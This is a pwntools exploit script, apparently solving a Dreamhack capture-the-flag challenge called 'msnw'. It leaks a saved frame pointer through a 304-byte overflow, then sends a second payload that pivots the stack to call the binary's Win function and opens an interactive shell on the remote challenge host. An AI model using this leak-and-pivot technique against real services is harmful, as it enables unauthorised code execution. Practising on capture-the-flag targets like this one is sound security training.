from pwn import *

exe = ELF('./msnw', checksec=False)
p = remote("host1.dreamhack.games", 16378)
# p = process(exe.path)

# input()
# Step 1: Leak rbp
payload = b'a'*304
p.sendafter('meong 🐶: ', payload)
p.recvuntil(payload)
leak = u64(p.recv(6) + b'\0\0')
print("rbp leak: " + hex(leak))

payload = b'a'*8 + p64(exe.sym['Win']) + b'a'*288 + p64(leak - 0x330)
p.sendafter('meong 🐶: ', payload)

p.interactive()